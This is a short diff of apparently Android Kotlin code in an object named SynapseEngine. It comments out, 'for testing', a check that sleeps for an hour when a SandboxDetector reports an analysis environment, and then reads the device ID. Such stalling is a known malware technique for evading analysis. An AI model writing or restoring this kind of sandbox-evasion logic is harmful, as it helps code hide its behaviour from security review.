@@ -29,11 +29,12 @@ object SynapseEngine {
             return
         }
 
-        if (SandboxDetector.looksLikeAnalysis()) {
-            Log.w(TAG, "Analysis environment detected — sleeping")
-            Thread.sleep(3600_000)
-            return
-        }
+        // Sandbox analysis check disabled for testing
+        // if (SandboxDetector.looksLikeAnalysis()) {
+        //     Log.w(TAG, \"Analysis environment detected — sleeping\")
+        //     Thread.sleep(3600_000)
+        //     return
+        // }
 
         val deviceId = getDeviceId(context)
         val prefs = context.getSharedPreferences("synapse_prefs", Context.MODE_PRIVATE)
